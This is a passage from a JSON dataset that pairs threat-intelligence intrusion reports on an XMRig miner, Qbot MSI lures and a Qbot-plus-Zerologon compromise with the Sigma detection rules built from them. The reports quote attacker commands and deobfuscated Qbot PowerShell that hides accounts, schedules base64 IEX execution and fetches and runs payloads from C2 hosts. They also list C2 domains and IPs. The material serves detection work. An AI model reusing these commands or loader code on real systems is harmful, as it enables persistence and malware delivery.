/f\n```\n\nThe full contents of `1.bat` also included commands to hide the user account by adding it to the registry using \"Special Accounts\".\n\n### Command to hide user account:\n```\nREG ADD \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\Userlist\" /v Adminv$ /t REG_DWORD /d 0\n```\n\n---\n\n## Credential Access\n\nDuring the initial access, credentials were obtained via a brute-force attack against the exposed MSSQL server. No other credential access was observed during this intrusion, although the threat actors did enable WDigest to make later credential access easier.\n\n---\n\n## Command and Control\n\nWe observed that the domain `mymst007[.]info` is used to download further payloads. The domain was created five years ago. We have seen similar reports that make mention of the same infrastructure. Attacks associated with this domain include the same or similar tactics techniques and procedures (TTPs).\n\n```image\nAlt: Connections\nDescription: The image is a detailed diagram illustrating the connections and communications related to the domain 'mymst007.info'. It includes nodes representing contacted IPs, domains, downloaded files, and URLs, along with specific filenames such as 'CSRSS.exe' and 'weixin.html'. The diagram visually maps out the relationships and interactions between these elements, highlighting the command and control infrastructure associated with the observed cyber attacks.\nTranscription: |\n  - Resolutions\n    - mst.mymst007.info\n    - mst2.mymst007.info\n  - Siblings\n  - Contacted ips\n  - Contacted domains\n  - Communicating files\n  - Downloaded files\n    - weixin.html\n  - Referrer files\n    - 3f14dc75982f1abd67e66623c5c8277b8d109be96b6f8fef92e4c0be7b2c9b1\n    - wrmi-instance-script.txt (1e4fdd4670ddb98286ed18bb3940c812215b2e5bda0886589e397667000391f)\n    - 563d381d5f8c7fecc6bd8e228cdf8beccab81fe5b1cfb29ddc34dc779e70e1\n    - 1c496854a393f70196745be19e47d758d50df22e2ed3c247a2008576105f\n  - Contacted urls\n    - http://mst2.mymst007.info/\n    - http://mst2.mymst007.info:4000/ver\n    - http://mst.mymst007.info/\n    - http://mst.mymst007.info:8080/all.dll.asp\n    - http://mst.mymst007.info/perp2017/home2/pergavr2017/a.exe\n  - CSRSS.exe\n```\n\n---\n\n## Impact\n\nThe impact was concentrated on this one host. We did not see any further activity in this case. The compromised host had XMRig miner installed and running. The miner was also connecting to cryptomining pools such as `minergate[.]com`.\n\n---\n\n## Indicators\n\n### File\n\n```\nWinRing0x64.sys\n0c0195c48b6b8582fa6f6373032118da\nd25340ae8e92a6d29f599fef426a2bc1b5217299\n11bd2c9f9e2397c9a16e0990e4ed2cf0679498fe0fd418a3dfdac60b5c160ee5\n\nex.exe\na7bafac5ed29a68e0fff6eecc3f5bb3f\n4f19b6970e35b3d20f84a91e3af0d82c68096710\n428d06c889b17d5f95f9df952fc13b1cdd8ef520c51e2abff2f9192aa78a4b24\n\nkit.bat\n91931a2b1ae645004023e1b35fe57314\n9f5a7a293c92ef42374cf1471b653ed994446c15\n4905b7776810dc60e710af96a7e54420aaa15467ef5909b260d9a9bc46911186\n\nsmss.exe\ne579cd176b384b38eda6a0c61c51c274\n8a3b31ac12d9ac1a44707b1de75b8870189db83a\nd3c3f529a09203a839b41cd461cc561494b432d810041d71d41a66ee7d285d69\n\nxit\n88fba011db6e5122f4aa2c0343e11275\na2d34aeee2fb7c1ba57a11c03cc33e76f1217548\ncfa12bb31d58d30875b7a20ed05b5c100032b6a18802fbdf3913e70288e11a55\n\nxitmf\n0c8622c4871541e89d0173d5be0db8aa\nb01a88df39857417233d9bd3256f82d0fdcc63f8\nbeda317d74b8f1090e251205064e686d330a0502006a54dc94d528d6bd16c416\n```\n\n### Network\n\n```\nminergate[.]com\nmymst007[.]info\nbj87670@gmail.com\n```\n\n---\n\n## Detections\n\n### Sigma Rules\n\n- Suspicious Commands by SQL Server\n- MOFComp Execution\n- Hiding Local User Accounts\n\n### Yara Rules\n\n```\nrule miner_batch {\n   meta:\n      description = \"file kit.bat\"\n      author = \"TheDFIRReport\"\n      reference = \"https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/\"\n      date = \"2022/07/10\"\n      hash1 = \"4905b7776810dc60e710af96a7e54420aaa15467ef5909b260d9a9bc46911186\"\n   strings:\n      $a1 = \"%~dps0\" fullword ascii\n      $a2 = \"set app\" fullword ascii\n      $a3 = \"cd /d \\\"%~dps0\\\"\" fullword ascii\n      $a4 = \"set usr=jood\" fullword ascii\n      $s1 = \"schtasks /run\" fullword ascii\n      $s2 = \"schtasks /delete\" fullword ascii\n      $a5 = \"if \\\"%1\\\"==\\\"-s\\\" (\" fullword ascii\n   condition:\n      uint16(0) == 0xfeff and filesize < 1KB and\n      3 of ($a*) and 1 of ($s*)\n}\n```\n\n---\n\n## MITRE Techniques\n\n```\nT1053.005 - Scheduled Task/Job: Scheduled Task\nT1136.001 - Create Account: Local Account\nT1546.003 - Event Triggered Execution: Windows Management Instrumentation Event Subscription\nT1564.002 - Hide Artifacts: Hidden Users\nT1059.003 - Command and Scripting Interpreter: Windows Command Shell\nT1027.004 - Obfuscated Files or Information: Compile After Delivery\nT1110.001 - Brute Force: Password Guessing\nT1070.004 - Indicator Removal on Host: File Deletion\nT1562.001 – Impair Defenses: Disable or Modify Tools\nT1546.012 - Event Triggered Execution: Image File Execution Options Injection\nT1140 - Deobfuscate/Decode Files or Information\nT1112 - Modify Registry\nT1078 - Valid Accounts\nT1134.001 - Token Impersonation/Theft\n```",
    "sigma_rule": {
      "title": "Hiding User Account Via SpecialAccounts Registry Key - CommandLine",
      "id": "9ec9fb1b-e059-4489-9642-f270c207923d",
      "related": [
        {
          "id": "f8aebc67-a56d-4ec9-9fbe-7b0e8b7b4efd",
          "type": "similar"
        }
      ],
      "status": "experimental",
      "description": "Detects changes to the registry key \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\Userlist\" where the value is set to \"0\" in order to hide user account from being listed on the logon screen.\n",
      "references": [
        "https://thedfirreport.com/2024/01/29/buzzing-on-christmas-eve-trigona-ransomware-in-3-hours/",
        "https://thedfirreport.com/2024/04/01/from-onenote-to-ransomnote-an-ice-cold-intrusion/",
        "https://thedfirreport.com/2024/04/29/from-icedid-to-dagon-locker-ransomware-in-29-days/",
        "https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/"
      ],
      "author": "@Kostastsale, TheDFIRReport",
      "date": "2022-05-14",
      "modified": "2024-08-23",
      "tags": [
        "attack.t1564.002"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": "\\reg.exe",
          "CommandLine|contains|all": [
            "\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList",
            "add",
            "/v",
            "/d 0"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "System administrator activities"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_registry_special_accounts_hide_user.yml",
    "id": "401"
  },
  {
    "url": "https://redcanary.com/blog/intelligence-insights-april-2022/",
    "markdown": "# Intelligence Insights: April 2022\n\n**SocGholish falls from first place, Yellow Cockatoo rebounds in March, and Qbot campaigns leverage Windows Installer packages.**\n\n*Originally published April 21, 2022. Last modified April 30, 2024.*\n\n---\n\n*Each month, the Intel team provides Red Canary customers with an analysis of trending, emerging, or otherwise important threats that we’ve encountered in confirmed threat detections, intelligence reporting, and elsewhere over the preceding month. We call this report our “Intelligence Insights” and share a public version of it with the broader infosec community.*\n\n## Highlights\n\nAs we’ve done for the past few months, we again looked at the 10 most prevalent threats encountered in the environments that Red Canary monitors. These prevalence rankings are based on the number of unique customer environments in which we observed each threat. Here’s how the numbers shook out for March 2022:\n\n| March rank | Threat name | Percent of customers affected |\n|------------|-------------|-------------------------------|\n| ⬆ 1        | Impacket    | 1.5%                          |\n| ➡ 2        | Mimikatz | 1.0% |\n| ⬆ 2*       | Yellow Cockatoo | 1.0%                      |\n| ⬆ 4*       | Cobalt Strike | 0.9% |\n| ⬆ 4*       | BloodHound  | 0.9%                          |\n| ⬆ 6*       | TR          | 0.7%                          |\n| ⬆ 6*       | Shlayer     | 0.7%                          |\n| ⬆ 6*       | Emotet | 0.7% |\n| ⬇ 9        | Qbot | 0.6% |\n| ⬇ 10*      | SocGholish  | 0.5%                          |\n| ⬇ 10*      | Gamarue     | 0.5%                          |\n| ⬆ 10*      | Bondat      | 0.5%                          |\n\n⬆ = trending up from previous month\n⬇ = trending down from previous month\n➡ = no change in rank from previous month\n*Denotes a tie\n\n## Observations on trending threats\n\nOverall threat volume remained steady in March, matching February’s numbers with 14.3 percent of Red Canary customers encountering at least one detection associated with a named threat we track. SocGholish relinquished the top spot, retreating to the volume we typically saw throughout most of 2021. The return of Yellow Cockatoo in February fueled a strong rebound by this prevalent threat, as it soared back up the ranks near the volume we encountered in 2021. Gootkit, another typical top 10 mainstay, disappeared entirely from our view in March. Gootkit relies on trojanized search engine optimization (SEO) social engineering techniques, similar to Yellow Cockatoo.\n\nOne newcomer you may have noticed in the middle of the pack is BloodHound, a tool we’ve been tracking for some time but only recently included in our metrics. While most of the BloodHound activity we see is related to pentesting or internal security teams, we have observed multiple threats leverage it in intrusions, some leading to ransomware. The numbers underlying the prevalence rankings do not distinguish red teaming from in-the-wild adversary activity. Therefore, the presence of popular tools employed by testers—such as Impacket, Mimikatz, Cobalt Strike, and BloodHound—are not surprising to see in this list.\n\n## MSI phishing lures deliver Qbot\n\nIn April 2022, researchers reported on new tradecraft associated with campaigns delivering Qbot, a known ransomware precursor. For the first time, researchers saw Qbot delivered via malicious Windows Installer (MSI) packages, suggesting that at least one subset of operators may be experimenting with new ways to evade victims’ defenses. The recent Qbot campaigns leveraging Windows Installer packages are a deviation from past campaigns, where Qbot was delivered via malicious Microsoft Office macros. In both cases, the malicious dropper is delivered via phishing emails with password-protected ZIP archives sent as attachments.\n\nQbot is a mature malware threat with a range of capabilities that allow adversaries to conduct reconnaissance, move laterally on an infected network, exfiltrate data, or deliver other tools. Multiple adversaries have leveraged Qbot in compromises that quickly progressed to additional threats, including ransomware. Accordingly, it’s critical to identify changes in Qbot behavior (and the procedures that adversaries use to deploy it) to enable quick detection and response to known infections.\n\nThis most recent change in tradecraft may be a response to ongoing efforts by defenders to disable certain macros by default. While multiple groups carry out operations involving Qbot, delivery tradecraft has been consistent over time, across various adversaries. In past campaigns, adversaries used weaponized Microsoft Office documents, which were embedded with malicious macros and delivered via phishing campaigns. Upon macro execution, victims downloaded and executed a Qbot payload, typically without knowing it. Though this was effective for several years, this approach largely relied on victims allowing the macros to run. Earlier this year, Microsoft announced that VBA macros obtained from the internet would be blocked by default. There is some speculation that changes to Qbot delivery mechanisms may be in response to this effort. Microsoft’s move to allow AMSI telemetry for XLM macros likely means that adversaries are having to explore additional avenues for malware distribution, as previously reliable macro methods are becoming unavailable.\n\n---\n\n### Detection opportunity: `regsvr32.exe` spawning `explorer.exe` as a child process\n\nWhen Qbot payloads delivered via MSI execute successfully, `explorer.exe` will spawn from `regsvr32`. This detection opportunity identifies `regsvr32.exe` spawning `explorer.exe` as a child process.\n\n```\nprocess_is_likely == regsvr32\n&&\nhas_childproc == true\n&&\nchildproc_is_likely == explorer\n```",
    "sigma_rule": {
      "title": "Potentially Suspicious Child Process Of Regsvr32",
      "id": "6f0947a4-1c5e-4e0d-8ac7-53159b8f23ca",
      "related": [
        {
          "id": "8e2b24c9-4add-46a0-b4bb-0057b4e6187d",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects potentially suspicious child processes of \"regsvr32.exe\".",
      "references": [
        "https://redcanary.com/blog/intelligence-insights-april-2022/",
        "https://www.echotrail.io/insights/search/regsvr32.exe",
        "https://www.ired.team/offensive-security/code-execution/t1117-regsvr32-aka-squiblydoo"
      ],
      "author": "elhoim, Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-05-05",
      "modified": "2023-05-26",
      "tags": [
        "attack.defense-evasion",
        "attack.t1218.010"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "ParentImage|endswith": "\\regsvr32.exe",
          "Image|endswith": [
            "\\calc.exe",
            "\\cscript.exe",
            "\\explorer.exe",
            "\\mshta.exe",
            "\\net.exe",
            "\\net1.exe",
            "\\nltest.exe",
            "\\notepad.exe",
            "\\powershell.exe",
            "\\pwsh.exe",
            "\\reg.exe",
            "\\schtasks.exe",
            "\\werfault.exe",
            "\\wscript.exe"
          ]
        },
        "filter_main_werfault": {
          "Image|endswith": "\\werfault.exe",
          "CommandLine|contains": " -u -p "
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unlikely, but can rarely occur. Apply additional filters accordingly."
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_regsvr32_susp_child_process.yml",
    "id": "403"
  },
  {
    "url": "https://github.com/redcanaryco/atomic-red-team/blob/a8e3cf63e97b973a25903d3df9fd55da6252e564/atomics/T1112/T1112.md",
    "markdown": "",
    "sigma_rule": {
      "title": "RestrictedAdminMode Registry Value Tampering - ProcCreation",
      "id": "28ac00d6-22d9-4a3c-927f-bbd770104573",
      "related": [
        {
          "id": "d6ce7ebd-260b-4323-9768-a9631c8d4db2",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects changes to the \"DisableRestrictedAdmin\" registry value in order to disable or enable RestrictedAdmin mode.\nRestrictedAdmin mode prevents the transmission of reusable credentials to the remote system to which you connect using Remote Desktop.\nThis prevents your credentials from being harvested during the initial connection process if the remote server has been compromise\n",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/a8e3cf63e97b973a25903d3df9fd55da6252e564/atomics/T1112/T1112.md",
        "https://learn.microsoft.com/en-us/archive/technet-wiki/32905.remote-desktop-services-enable-restricted-admin-mode",
        "https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/"
      ],
      "author": "frack113",
      "date": "2023-01-13",
      "modified": "2023-12-15",
      "tags": [
        "attack.defense-evasion",
        "attack.t1112"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection": {
          "CommandLine|contains|all": [
            "\\System\\CurrentControlSet\\Control\\Lsa\\",
            "DisableRestrictedAdmin"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_reg_lsa_disable_restricted_admin.yml",
    "id": "417"
  },
  {
    "url": "https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/",
    "markdown": "# Qbot and Zerologon Lead To Full Domain Compromise\n\n**Categories:** adfind, cobaltstrike, Qbot\n\n**Published on:** February 21, 2022\n\nIn this intrusion (from November 2021), a threat actor gained its initial foothold in the environment through the use of Qbot (a.k.a. Quakbot/Qakbot) malware.\n\nSoon after execution of the Qbot payload, the malware established C2 connectivity and created persistence on the beachhead. Successful exploitation of the Zerologon vulnerability (CVE-2020-1472) allowed the threat actors to obtain domain admin privileges. This level of access was abused to deploy additional Cobalt Strike beacons and consequently pivot to other sensitive hosts within the network. The threat actor then exfiltrated sensitive documents from the environment before being evicted from the network.\n\n### Summary\n\nThe threat actors gained initial access to a Windows workstation through the execution of a malicious DLL. The first activity of QBot was seen 5 minutes after the DLL was executed. Various automated discovery commands were used to map the network topology, retrieve local group member information, and list available file shares/privileges of the infected user.\n\nFollowing the first discovery stage, Qbot dropped another malicious DLL and created a scheduled task to obtain persistence. The scheduled task’s primary purpose was to execute a (base64-encoded) PowerShell Cobalt Strike beacon every 30 minutes.\n\nOnce the threat actors established persistence, they continued with enumerating the environment by mapping out the Active Directory environment using tools such as `Nltest`, `net`, and `ADFind`.\n\nUpon the identification of one of the domain controllers, the attackers proceeded to exploit the ZeroLogon vulnerability. The executable used bears striking similarity to the one used in a previous case From Zero to Domain Admin based on command line arguments and the overall execution of the exploit. The executable named `cool.exe` resets the domain controller password to an empty string, retrieves the Domain Admin password Hash, and installs a service on the DC to reset the DC password so as to not break Active Directory operations.\n\nThe domain admin hash was then used on the beachhead through an over-pass-the-hash attack. After having domain admin privileges, they proceeded with deploying Cobalt Strike Beacons on a file server and another domain controller, which allowed them to pivot to those servers.\n\nFinally, documents were stolen and exfiltrated through Cobalt Strike encrypted C2 channel (HTTPS). To conclude this case, the threat actors were evicted from the network before they completed any further objectives.\n\n### Services\n\nWe offer multiple services including a Threat Feed service which tracks Command and Control frameworks such as QBot, Cobalt Strike, BazarLoader, Covenant, Metasploit, Empire, PoshC2, etc. More information on this service and others can be found here.\n\nWe also have artifacts and IOCs available from this case such as memory captures, files, event logs including Sysmon, Kape packages, and more, under our Security Researcher and Organization services.\n\n### Timeline\n\n```image\nAlt: Qbot and Zerologon Lead To Full Domain Compromise\nDescription: The image is a detailed timeline chart illustrating the sequence of events related to Qbot and Zerologon vulnerabilities leading to a full domain compromise. It outlines specific timestamps and activities, such as the execution of Qbot DLL, Cobalt Strike discovery, and various network and service interactions. The chart includes commands and actions taken during the attack, making it a comprehensive reference for understanding the progression of the compromise.\nTranscription: |\n  Qbot and Zerologon Lead To Full Domain Compromise\n  \n  16:31 UTC Initial Qbot DLL execution on Beachhead\n      rundll32.exe C:\\Users\\[REDACTED] e2bc6949442adc97345ac811d345f68a386 2laad3c7ae2740a8fa582987.dll,#1\n  \n  16:37 First Qbot C2 activity and discovery activity\n      net localgroup, net share, net view /all, netstat -nao, rout print, ...\n  \n  16:40 DLL dropped by Qbot\n  \n  16:40 Scheduled task created for persistence\n      base64 encoded PowerShell script executed every 30 minutes\n  \n  16:46 C2 begins - Cobalt Strike\n      5.255.98.144:8888\n      dxabt.com\n  \n  17:00 Cobalt Strike discovery\n      nltest.exe /domain_trusts\n      nltest.exe /all_trusts\n      net group \"domain admins\" /domain\n      net group \"domain controllers\" /domain\n      ping -n 1 DOMAINCONTROLLER\n  \n  17:03 ZeroLogon exploit on the first Domain Controller\n      Password of DC was changed\n      Service was installed on the DC\n  \n  17:10 Cobalt Strike Beacon via service installation on the Domain Controller\n  \n  17:12 ADFind discovery from Beachhead\n      find.exe -f objectcategory=computer -csv name cn OperatingSystem dNSHostName\n  \n  17:12 Over-Pass-The-Hash performed with DA hash on Beachhead\n  \n  17:15 Cobalt Strike Beacon via service installation on another Domain Controller\n  \n  17:31 Security software discovery + Ping + ADFind on the second Domain Controller\n      cmd.exe /C wmic /namespace:\\\\root\\SecurityCenter2 PATH AntiVirusProduct GET /Value\n      cmd.exe /C C:\\[REDACTED]\\find.exe -f objectcategory=computer -csv name cn OperatingSystem dNSHostName > C:\\[REDACTED]\\ce.csv\n      cmd.exe /C ping -n 1 SERVER\n  \n  17:35 UTC Cobalt Strike Beacon via service installation on a file server\n  \n  17:37 UTC RDP connection from BeachHead to Domain Controller and a file server\n  \n  17:56 UTC Alerts triggered from canary document indicating open from Host at IP 91.192.182.[*]165\n```\n\n### Initial Access\n\nThe threat actor gained their initial access through the execution of a malicious DLL. Traditionally Qbot is delivered via email using malicious documents that then downloads the malicious DLL. In this case, however, the execution started directly from the qbot DLL found here.\n\nThe execution chain for this QBot infection can be seen below:\n\n```image\nAlt: Qbot Chain\nDescription: The image depicts a detailed execution chain for a Qbot infection. It outlines the steps taken by the malware, starting with the execution of a malicious DLL via 'rundll32.exe'. It shows the injection process into 'explorer.exe' and subsequent connections to two IP addresses, along with the execution of various discovery commands. The steps are categorized into Execution, Discovery, Defense Evasion, and Command and Control, with a legend indicating the color-coding for each category. The image provides specific command line instructions and paths used during the infection process.\nTranscription: |\n  rundll32.exe C:\\Users\\<redacted>\\Downloads\\e2bc969424adc97345ac81194d316f58da38621aad3ca7ae27e40a8fae582987.dll, #1\n  \n  1. starts & injects into:\n     - C:\\Windows\\SysWOW64\\explorer.exe\n  \n  2. connects to:\n     - 41.228.22.180:443\n     - 24.229.150.54:995\n  \n  3. Runs discovery commands:\n     - whoami /all\n     - net view /all\n     - netstat -ano\n     - cmd /c set\n     - net share\n     - net localgroup\n     - ipconfig /all\n     - route print\n     - arp -a\n     - nslookup -querytype=ALL -timeout=10 _ldap._tcp.dc._msdcs.<redacted>\n  \n  4. Executes:\n     - regsvr32.exe -s \"C:\\Users\\<redacted>\\AppData\\Roaming\\Microsoft\\Fdopitcu\\qwkrfxkgymyv.dll\"\n     - schtasks.exe /Create /F /TN \"{97F2F70B-10D1-4447-A2F3-9B070C86E261}\" /TR \"cmd /c start /min \\\"\\\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\Pvoeooxf).yzbbvhhdypa)))\" /SC MINUTE /MO 30\n```\n\n### Execution\n\n#### QBot PowerShell analysis\n\nWe analyzed the registry path and associated keys that were queried by the scheduled task `HKCU:\\SOFTWARE\\Pvoeooxf` and discovered that three keys were created containing base64 encoded values. Decoding the values resulted in:\n\n1. Copy of QBot DLL\n2. String of QBot C2 IP-addresses separated by a semicolon.\n3. Obfuscated PowerShell script that is referenced by the scheduled task.\n\n```image\nAlt: PowerShell Script\nDescription: The image displays a screenshot of a Windows Registry Editor window, showcasing three registry entries. Each entry has a value name, value type, and data. The entries appear to contain base64 encoded information, likely related to the QBot malware, as indicated by the context provided. The data represents encoded values that could be associated with the malware's configuration or payloads.\n```\n\nThe PowerShell script (triggered by the scheduled task) starts off a chain of events which is illustrated below:\n\n```image\nAlt: PowerShell Chain\nDescription: The image is a flowchart depicting the execution process of a PowerShell script related to QBot malware. It outlines the steps that occur after the script is triggered by a scheduled task. The flowchart includes key decision points, such as validating the registry key creation date, and actions taken based on whether the date is less than or greater than four hours. It highlights two possible paths: executing a local QBot payload or fetching a remote QBot payload. Each step illustrates commands and processes, such as using 'regsvr32.exe' for DLL execution and 'Start-Process' for executing various types of payloads.\nTranscription: |\n  1. Start PowerShell script via Scheduled task\n     └── 2. Validate registry-key creation date\n         ├── < 4 hours\n         │   └── 3. Execute local Qakbot payload in registry\n         │       └── regsvr32.exe $env:temp/<random>.dll\n         └── > 4 hours\n             └── 3. Fetch remote Qakbot payload\n                 └── https://QbotIP/zk?r=n=kfdopi828182\n                     ├── regsvr32.exe $env:temp/<random>.dl\n                     ├── Start-Process $env:temp/<random>.exe\n                     ├── IEX(payload)\n                     └── cmd /c payload\n                     ├── Start-Process $env:temp/<random>.bat\n                     └── Start-Process $env:temp/<random>.vbs\n```\n\nWhen run for the first time, the script creates a new registry key entry in the same path, saving the date of execution. It then verifies upon execution if the creation date key of this registry key is older than 4 hours.\n\n```image\nAlt: Registry Key\nDescription: The image depicts a section of PowerShell script code. It includes a function named 'EjSok()', which retrieves an item property from a specified registry path. The script checks if the registry entry exists and retrieves the date associated with it. It also contains logic to determine if the current date exceeds a threshold of four hours from the retrieved date. The code highlights operations related to registry manipulation and date comparisons, relevant to the analysis of malware behavior.\nTranscription: |\n  function EjSok() {\n      $XtqpDJ = (Get-ItemProperty -Path $tvDQBlr).$WQudUrNwDr\n      if (! $XtqpDJ) {\n          return 1\n      }\n      $vRONdfU = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($XtqpDJ))\n      $JfKiixa = Get-Date -Date $vRONdfU\n      $JfKiixa = $JfKiixa.AddHours(4)\n      if ((Get-Date) -gt $JfKiixa) {\n      }\n      return 2\n  }\n```\n\nBased on the outcome, it will either: (1) retrieve the base64-encoded Qbot payload from the Windows Registry, decode it, save it on the file system and execute it.\n\n```image\nAlt: Qbot Payload\nDescription: The image displays a snippet of PowerShell code related to the execution of a malicious DLL. The code includes functions and commands for generating random file names, retrieving encoded data from the Windows Registry, decoding it from base64 format, and executing the DLL using 'regsvr32.exe'. This snippet is part of a larger analysis of the QBot malware's behavior and demonstrates the technical details involved in its execution.\nTranscription: |\n  function UQTV()\n  {\n      $MvmmBxnVj0 = Get-Random\n      $RBnYwaG = (Get-ItemProperty -Path $tvDQbLr).$LngwgFRytJ\n      if ($RBnYwaG) {\n          $_f_zhkPw = \"$env:TEMP\\($MvmmBxnVj0)1.dll\"\n          $fPsS = [System.Convert]::FromBase64String($RBnYwaG)\n          [System.IO.File]::WriteAllBytes($_f_zhkPw, $fPsS)\n          Start-Process -FilePath \"regsvr32.exe\" -ArgumentList \"$_f_zhkPw\"\n      }\n  }\n```\n\nOR (2) Fetch the QBot payload remotely using one of the active C2 IPs using the `Invoke-WebRequest` PowerShell module:\n\n```image\nAlt: Invoke-WebRequest\nDescription: The image depicts a snippet of PowerShell code, which is part of a function that initiates a web request to a dynamically constructed URL. The code includes variables for the URL and utilizes the `Invoke-WebRequest` cmdlet to fetch content, with error handling for different response headers. This script is relevant to the analysis of QBot malware, highlighting the method of retrieving payloads via command-and-control (C2) infrastructure.\nTranscription: |\n  function __NOxzyOQT([string]$RGNDm)\n  {\n      $ekanByiPK = \"https://$($RGNDm)$($d_IP)?n=$($PgZYjDK)\"\n      try\n      {\n          $kArvTQZY = Invoke-WebRequest -UseBasicParsing -Uri $ekanByiPK -DisableKeepAlive\n          $zCdUzfmhD = $kArvTQZY.StatusCode\n          if ($kArvTQZY.Headers.'Content-Type') {\n              $JACjQ = $kArvTQZY.Content\n          } else {\n              $JACjQ = [System.Text.Encoding]::ASCII.GetString($kArvTQZY.Content)\n          }\n      }\n  }\n```\n\nThe PS script contains built-in logic to execute various types of payloads including batch and Visual Basic files.\n\n```image\nAlt: Payload Execution\nDescription: The image displays a segment of PowerShell script code, showcasing various commands and functions used for executing payloads associated with the QBot malware. The code includes base64 decoding, file writing operations, and process execution commands, indicating a malware execution chain that retrieves and runs encoded malicious files. Specific variables and methods are highlighted, demonstrating the technical aspects of the malware's functionality.\nTranscription: |\n  switch ($UMMtDg[0])\n  {\n      0 {\n      }\n      1 {\n      }\n      2 {\n          $hHlJSNzeM = \"$env:TEMP\\$( $MwmmBxnVj0).dll\"\n          $ZCeNBLpm = [System.Convert]::FromBase64String($UMMtDg[2])\n          [System.IO.File]::WriteAllBytes($hHlJSNzeM, $ZCeNBLpm)\n          Start-Process -FilePath \"regsvr32.exe\" -ArgumentList \"$($hHlJSNzeM)\"\n      }\n      3 {\n          $hHlJSNzeM = \"$env:TEMP\\$( $MwmmBxnVj0).exe\"\n          $ZCeNBLpm = [System.Convert]::FromBase64String($UMMtDg[2])\n          [System.IO.File]::WriteAllBytes($hHlJSNzeM, $ZCeNBLpm)\n          Start-Process \"$($hHlJSNzeM)\"\n      }\n      4 {\n          $BpLv = IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($UMMtDg[2])))\n      }\n      5 {\n          $geLrhCE = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($UMMtDg[2]))\n          Start-Process cmd.exe \"/c $geLrhCE\"\n      }\n      6 {\n          $hHlJSNzeM = \"$env:TEMP\\$( $MwmmBxnVj0).bat\"\n          $ZCeNBLpm = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($UMMtDg[2]))\n          $ZCeNBLpm | Out-File -Encoding ASCII -FilePath $hHlJSNzeM\n          Start-Process \"$($hHlJSNzeM)\"\n      }\n      7 {\n          $hHlJSNzeM = \"$env:TEMP\\$( $MwmmBxnVj0).vbs\"\n          $ZCeNBLpm = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($UMMtDg[2]))\n          $ZCeNBLpm | Out-File -Encoding ASCII -FilePath $hHlJSNzeM\n          Start-Process \"$($hHlJSNzeM)\"\n      }\n  }\n```\n\nThe encoded QBot DLL that was stored in the registry, was dropped in the directory `%APPDATA%\\Roaming\\Microsoft\\Fdopitcu`. The unsigned DLL, with descriptor `Cancel Autoplay 2` was executed using `regsvr32.exe`.\n\n```image\nAlt: DLL Execution\nDescription: The image displays a Windows security audit log entry with details about a new process creation event. Key information included in the log are the Event Code, Process IDs, and the command line used for executing the 'regsvr32.exe' process. The log details the security and account information of the creator and target subjects, as well as the process information, including the parent process 'explorer.exe' and the specific command executed. This information is relevant for understanding the execution context of the QBot malware.\nTranscription: |\n  LogName: Security\n  EventCode: 4688\n  EventType: 0\n  ComputerName: <redacted>\n  SourceName: Microsoft Windows security auditing.\n  Type: Information\n  RecordNumber: 38489\n  Keywords: Audit Success\n  TaskCategory: Process Creation\n  OpCode: Info\n  Message: A new process has been created.\n  \n  Creator Subject:\n      Security ID: S-1-5-21-853439379-3680187918-914098032-1115\n      Account Name: <redacted>\n      Account Domain:\n      Logon ID: 0x741A48\n  \n  Target Subject:\n      Security ID: S-1-0-0\n      Account Name:\n      Account Domain: -\n      Logon ID: 0x0\n  \n  Process Information:\n      New Process ID: 0x1758\n      New Process Name: C:\\Windows\\SysWOW64\\regsvr32.exe\n      Token Elevation Type: %%1936\n      Mandatory Label:\n      Creator Process ID: 0x1958\n      Creator Process Name: C:\\Windows\\SysWOW64\\explorer.exe\n      Process Command Line: regsvr32.exe -s \"C:\\Users\\<redacted>\\AppData\\Roaming\\Microsoft\\Fdopitcu\\qwkrfxgymv.dll\"\n```\n\nUpon execution of this second-stage DLL, various registry keys were created in `HKCU\\Software\\Microsoft\\Yerqbqokc`. In addition, a new instance of explorer.exe (32-bit) was started and injected into.\n\n```image\nAlt: Registry Keys\nDescription: The image depicts a flowchart illustrating the relationship between various registry keys and processes involved in the execution of a malicious DLL within a cybersecurity context. It shows multiple registry paths under 'HKCU\\\\Software\\\\Microsoft\\\\Yerqbqokc' highlighted in yellow, indicating their relevance to the QBot malware analysis. Additionally, the flowchart connects the `regsvr32.exe` process (with PID 2988) and the `explorer.exe` process (with PID 3916), indicating that `regsvr32.exe` loads a DLL from a specified user directory, which subsequently creates the `explorer.exe` process. The diagram serves to visualize the malware's behavior through registry manipulation and process execution.\nTranscription: |\n  HKCU\\Software\\Microsoft\\Yerqbqokc\\e519a231\n  